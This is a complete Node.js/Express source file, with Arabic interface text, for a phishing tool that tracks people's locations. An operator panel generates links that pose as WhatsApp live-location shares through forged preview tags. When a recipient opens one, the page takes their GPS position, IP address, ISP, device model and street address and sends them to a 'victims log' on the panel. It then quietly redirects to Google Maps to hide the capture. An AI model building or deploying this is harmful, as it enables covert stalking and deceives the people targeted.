const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.json());

// 1. لوحة التحكم المركزية
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>لوحة التحكم - الروابط السرية</title>
        <style>
            body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
            .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); text-align: right; }
            h2, h3 { text-align: center; }
            button { background: #25D366; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
            button:hover { opacity: 0.9; }
            input, select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; margin-top: 8px; box-sizing: border-box; }
            .section { margin-bottom: 25px; border-bottom: 1px solid #333; padding-bottom: 20px; }
            .info-box { background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #25D366; font-size: 14px; line-height: 1.7; }
        </style>
    </head>
    <body>
        <h2>🎛️ لوحة التحكم - نظام الخرائط المخفي</h2>
        
        <div class="card">
            <h3>🔗 توليد رابط معاينة الخريطة</h3>
            <div class="section">
                <p style="font-size: 13px; color: #aaa;">سيظهر الرابط في واتساب كمعاينة موقع حقيقي، وعند فتحه يمر بسیناريو مخفي وينتقل للخريطة الطبيعية.</p>
                <button type="button" onclick="makeLink()">🗺️ إنشاء رابط الخريطة الذكي</button>
            </div>

            <div id="linkContainer" style="display:none; margin-top: 15px;">
                <label>الرابط الجاهز للنسخ والإرسال:</label>
                <input type="text" id="linkInput" readonly onclick="this.select();">
            </div>
        </div>

        <h3>📥 سجل الضحايا والمواقع الواردة:</h3>
        <div id="logs" class="card">
            <p style="color: #aaa; text-align: center;">في انتظار تفاعلات الضحايا...</p>
        </div>

        <script src="/socket.io/socket.io.js"></script>
        <script>
            function makeLink() {
                const uniqueId = Math.random().toString(36).substring(2, 8);
                const fullUrl = window.location.origin + '/map-view/' + uniqueId;
                
                document.getElementById('linkInput').value = fullUrl;
                document.getElementById('linkContainer').style.display = 'block';
            }

            let victimCounter = 1;
            const socket = io();
            socket.on('new-device-data', (data) => {
                const logs = document.getElementById('logs');
                if (logs.innerText.includes('في انتظار تفاعلات')) logs.innerHTML = '';
                
                const box = document.createElement('div');
                box.className = 'info-box';
                box.innerHTML = '<strong>🔴 الضحية رقم (# ' + victimCounter++ + ')</strong><br>' +
                                '<strong>📱 ماركة الهاتف:</strong> ' + data.deviceName + '<br>' +
                                '<strong>🌐 المتصفح والنظام:</strong> ' + data.browser + ' / ' + data.os + '<br>' +
                                '<strong>📡 الشبكة (ISP):</strong> ' + data.networkISP + '<br>' +
                                '<strong>🌐 عنوان IP:</strong> ' + data.ip + '<br>' +
                                '<strong>📍 العنوان الدقيق (الشارع والمنطقة):</strong> <span style="color: #4CAF50; font-weight: bold;">' + data.fullAddress + '</span><br>' +
                                (data.lat ? '<strong>🗺️ إحداثيات الخريطة:</strong> <a href="https://maps.google.com/?q=' + data.lat + ',' + data.lon + '" target="_blank" style="color: #00bcd4;">فتح على خرائط جوجل</a><br>' : '') +
                                '<strong>🕒 وقت الدخول:</strong> ' + data.time;
                logs.prepend(box);
            });
        </script>
    </body>
    </html>
  `);
});

// 2. صفحة معاينة الموقع (تحتوي على وسوم واتساب الحقيقية وتطلب الإذن ثم تنقل للخريطة بصمت)
app.get('/map-view/:id', async (req, res) => {
  let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
  if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();

  res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>موقع جغرافي مباشر - Live Location</title>
        
        <!-- وسوم واتساب لتبدو كمعاينة موقع رسمية تماماً -->
        <meta property="og:title" content="📍 مشاركة موقع مباشر (Live Location)">
        <meta property="og:description" content="تم مشاركة موقع جغرافي معك. اضغط لعرض المكان الحالي على الخريطة.">
        <meta property="og:image" content="https://images.unsplash.com/photo-1526778548025-fa2f459cd5c1?w=600&auto=format&fit=crop&q=80">
        <meta property="og:url" content="${req.protocol}://${req.get('host')}${req.originalUrl}">
        <meta property="og:type" content="website">

        <style>
            body { font-family: Arial, sans-serif; background: #e5ddd5; color: #333; margin: 0; padding: 0; text-align: center; display: flex; justify-content: center; align-items: center; height: 100vh; }
            .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); max-width: 400px; width: 90%; }
            .icon { font-size: 50px; margin-bottom: 15px; }
            h3 { margin-bottom: 10px; color: #075e54; }
            p { color: #555; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
            button { background: #25d366; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 25px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
            button:hover { background: #128c7e; }
            #status { margin-top: 15px; font-size: 13px; color: #666; }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="icon">📍</div>
            <h3>عرض الموقع المباشر</h3>
            <p>انقر أدناه لتحميل الخريطة وتحديد المسار والاتجاهات بدقة على هاتفك.</p>
            <button onclick="requestLocation()">فتح الخريطة الآن</button>
            <div id="status"></div>
        </div>

        <script>
            function getExactDeviceModel(ua) {
                let match = ua.match(/(Redmi\\s[\\w\\d]+|SM-[A-Z0-9]+|iPhone\\s[\\w\\s]+|POCO\\s[\\w\\d]+|Pixel\\s[\\td\\w\\s]+|Huawei\\s[\\w\\d]+|OPPO\\s[\\w\\d]+|Vivo\\s[\\w\\d]+)/i);
                if (match) return match[0];
                if (ua.includes('Android')) return 'هاتف Android';
                if (ua.includes('iPhone')) return 'Apple iPhone';
                if (ua.includes('Windows')) return 'Windows Computer';
                return 'جهاز ذكي';
            }
            function getBrowserInfo(ua) {
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
                if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
                if (ua.includes('Edg')) return 'Edge';
                if (ua.includes('Chrome')) return 'Chrome';
                if (ua.includes('Safari')) return 'Safari';
                return 'متصفح آخر';
            }
            function getOSInfo(ua) {
                if (ua.includes('Win')) return 'Windows';
                if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
                if (ua.includes('Android')) return 'Android';
                if (ua.includes('Mac')) return 'macOS';
                return 'أخرى';
            }

            function requestLocation() {
                document.getElementById('status').innerText = "جاري الاتصال بالأقمار الصناعية...";

                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (pos) => {
                            const lat = pos.coords.latitude;
                            const lon = pos.coords.longitude;
                            
                            const ua = navigator.userAgent;
                            const deviceData = {
                                deviceName: getExactDeviceModel(ua),
                                browser: getBrowserInfo(ua),
                                os: getOSInfo(ua),
                                ip: "${clientIp}",
                                networkISP: "جاري الجلب...",
                                fullAddress: "جاري تحويل الإحداثيات...",
                                lat: lat,
                                lon: lon,
                                time: new Date().toLocaleTimeString('ar-EG')
                            };

                            try {
                                const response = await fetch('https://ipapi.co/${clientIp}/json/');
                                const ipData = await response.json();
                                deviceData.networkISP = ipData.org || "غير معروف";
                            } catch(e){}

                            try {
                                const resGeo = await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat=' + lat + '&lon=' + lon + '&accept-language=ar');
                                const geoData = await resGeo.json();
                                if (geoData && geoData.display_name) {
                                    deviceData.fullAddress = geoData.display_name;
                                } else {
                                    deviceData.fullAddress = "خطوط الطول: " + lat + ", العرض: " + lon;
                                }
                            } catch(err) {
                                deviceData.fullAddress = "خطوط الطول: " + lat + ", العرض: " + lon;
                            }

                            // إرسال البيانات للوحة التحكم لديك
                            fetch('/api/log', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(deviceData)
                            }).then(() => {
                                // 3. الانتقال الفوري لصفحة بيضاء مؤقتة ثم التحويل التلقائي لخرائط جوجل الحقيقية
                                document.body.innerHTML = '<div style="background:#fff; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; font-family:sans-serif; color:#333;"><h3>جاري تحميل الخريطة...</h3></div>';
                                
                                setTimeout(() => {
                                    window.location.href = "https://maps.google.com/?q=" + lat + "," + lon;
                                }, 800); // الانتقال للخريطة الحقيقية بعد أقل من ثانية
                            });
                        },
                        (err) => {
                            document.getElementById('status').style.color = "red";
                            document.getElementById('status').innerText = "يجب السماح بالموقع لعرض الخريطة.";
                        },
                        { timeout: 10000, enableHighAccuracy: true }
                    );
                } else {
                    alert("المتصفح لا يدعم تحديد الموقع");
                }
            }
        </script>
    </body>
    </html>
  `);
});

app.post('/api/log', (req, res) => {
  io.emit('new-device-data', req.body);
  res.json({ status: 'success' });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
